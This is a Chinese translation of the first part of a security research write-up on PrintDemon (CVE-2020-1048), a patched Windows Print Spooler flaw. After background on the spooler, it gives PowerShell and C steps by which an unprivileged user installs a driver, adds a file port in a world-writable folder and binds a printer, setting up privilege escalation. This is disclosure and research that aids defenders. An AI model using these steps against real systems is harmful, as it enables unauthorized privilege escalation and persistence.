# PrintDemon：详解Print Spooler中的权限提升及持久化技术（Part 1）
##### 译文声明
本文是翻译文章，文章原作者 windows-internals，文章来源：windows-internals.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
前面我们已经与大家分享过FaxHell相关技术细节，随着微软在周二补丁日例行发布安全公告后（包括[`CVE-2020-1048`](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1048)的补丁），现在我们可以与大家继续分享[Windows Print
Spooler](https://docs.microsoft.com/en-us/windows/win32/printdocs/print-spooler)的技术细节，以及如何利用Print Spooler来实现权限提升、绕过EDR规则、实现持久化等。Print
Spooler目前仍是最古老的Windows组件之一，从Windows NT
4以来基本没有什么变化。即使曾经被Stuxnet（震网）病毒滥用过（使用过我们即将与大家一起分析的一些API），Print
Spooler仍然没有经过特别全面的审查。之前有个第三方研究团队首先[分析](http://blog.ismaelvalenzuela.com/wp-content/uploads/2009/11/my_erp_got_hacked_1.pdf)过Print
Spooler，发现了微软未发现过的利用点，最终被Stuxnet幕后团队所使用。
## 0x01 背景知识
虽然我们比较喜欢深入分析Windows组件的各种精妙之处，但还是想尽量保证简洁性，只重点关注这些问题的严重性，分析如何简单滥用/利用这些问题，同时也会给防御方提供一些小建议。
首先我们来简单看一下打印过程，这里我们并不会讨论监视器、服务提供程序或者处理器，只讨论最基础的打印流程。
首先，打印机必须至少具备两个元素：
1、打印机端口：之前是`LPT1`，现在是USB口或者`TCP/IP`端口（以及地址）。
> 某些人可能知道还存在`FILE:`形式，这意味着打印机可以将内容打印到文件（Windows 8及以上系统为`PORTPROMPT:`）。
2、打印机驱动：之前这是一个内核模式组件，在新的`V4`模型下，十多年来已改成用户模式下工作。
由于`Spooler`服务（在`Spoolsv.exe`中实现）以`SYSTEM`权限运行，并且网络可达，因此这两个元素成功吸引了许多人的注意，尝试发起所有有趣的攻击，包括：
1、希望`Spooler`能将文件[打印](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3239)到某个特权位置；
2、[加载](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-087?redirectedfrom=MSDN)恶意的“打印机驱动”；
3、通过`Spooler` RPC API远程投放文件；
4、从远程系统注入“打印机驱动”；
5、[滥用](https://www.exploit-db.com/exploits/43465)EMF/XPS
spooler文件中的文件解析bug来获得代码执行权限。
以上大多数尝试的确发现过bug，微软也针对某些bug加强了防御措施。即便如此，系统中还是存在不少逻辑问题，有些甚至是设计上的缺陷，会导致出现一些有趣的行为。
回到我们的话题，为了滥用打印机，我们首先必须加载一个打印机驱动。正常情况下，大家都会认为这需要高权限才能执行，并且有些MSDN页面还提示我们需要[`SeLoadDriverPrivilege`](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)。然而从Vista开始，为了便于普通用户账户操作（并且现在会在用户模式下运行），因此实际情况会比较复杂。只要目标驱动是预先存在的内置驱动，我们不需要特权就能安装打印机驱动。
我们先来安装最简单的一个驱动：`Generic / Text-Only`驱动。（以普通用户权限）打开PowerShell窗口，然后输入：
    Add-PrinterDriver -Name "Generic / Text Only"
接着枚举已安装的驱动：
    > Get-PrinterDriver
    Name                                PrinterEnvironment MajorVersion    Manufacturer
    ----                                ------------------ ------------    ------------    Microsoft XPS Document Writer v4    Windows x64        4               Microsoft
    Microsoft Print To PDF              Windows x64        4               Microsoft
    Microsoft Shared Fax Driver         Windows x64        3               Microsoft
    Generic / Text Only                 Windows x64        3               Generic
如果想用C语言来完成，也可以使用如下语句：
    hr = InstallPrinterDriverFromPackage(NULL, NULL, L"Generic / Text Only", NULL, 0);
接下来是将新打印机与某个端口绑定。这里比较有趣的是（官方没有详细说明）：端口也可以使用文件，并且这与“打印到文件”有所不同。此时是一个文件端口，这是完全不同的一个概念。我们只需要在PowerShell中使用如下一行命令就可以（这里我们用的是全局可写的一个目录）：
    Add-PrinterPort -Name "C:\windows\tracing\myport.txt"
获取打印机端口：
    > Get-PrinterPort | ft Name
    Name
    ----    C:\windows\tracing\myport.txt
    COM1:
    COM2:
    COM3:
    COM4:
    FILE:
    LPT1:
    LPT2:
    LPT3:
    PORTPROMPT:
    SHRFAX:
如果想用C来完成，我们可以有两种选择。我们可以使用[`AddPortW`](https://docs.microsoft.com/en-us/windows/win32/printdocs/addport)
API，弹出窗口要求用户输入端口名。我们并不需要设计GUI，可以传入`NULL`作为`hWnd`参数的值，当用户创建端口后，程序才会解除阻塞状态。UI如下所示：
另一种方法是使用[`XcvData`](https://docs.microsoft.com/en-us/previous-versions/ff564255\(v%3Dvs.85)) API来手动复制以上窗口的逻辑，如下所示：
    PWCHAR g_PortName = L"c:\\windows\\tracing\\myport.txt";
    dwNeeded = ((DWORD)wcslen(g_PortName) + 1) * sizeof(WCHAR);
    XcvData(hMonitor,
            L"AddPort",
            (LPBYTE)g_PortName,
            dwNeeded,
            NULL,
            0,
            &dwNeeded,
            &dwStatus);
这里比较复杂的是获取`hMonitor`，需要一些神秘知识：
    PRINTER_DEFAULTS printerDefaults;
    printerDefaults.pDatatype = NULL;
    printerDefaults.pDevMode = NULL;
    printerDefaults.DesiredAccess = SERVER_ACCESS_ADMINISTER;
    OpenPrinter(L",XcvMonitor Local Port", &hMonitor, &printerDefaults);
以上代码中存在`ADMINISTER`字样，因此大家可能会觉得需要`Administrator`权限，但事实并非如此：任何人都可以添加端口。不过如果我们传入不具备访问权限的路径，将会得到“访问被拒绝”错误。稍后我们再讨论这一点。
代码处理完毕后，别忘了调用`ClosePrinter(hMonitor)`。
现在我们已经拿到了一个端口和一个打印机驱动，我们只需要利用这两个元素就能创建并绑定一个打印机。这个过程同样不需要特权用户，只需要如下一行PowerShell命令：
    Add-Printer -Name "PrintDemon" -DriverName "Generic / Text Only" -PortName "c:\windows\tracing\myport.txt"
然后使用如下语句来检查效果：
    > Get-Printer | ft Name, DriverName, PortName
    Name DriverName PortName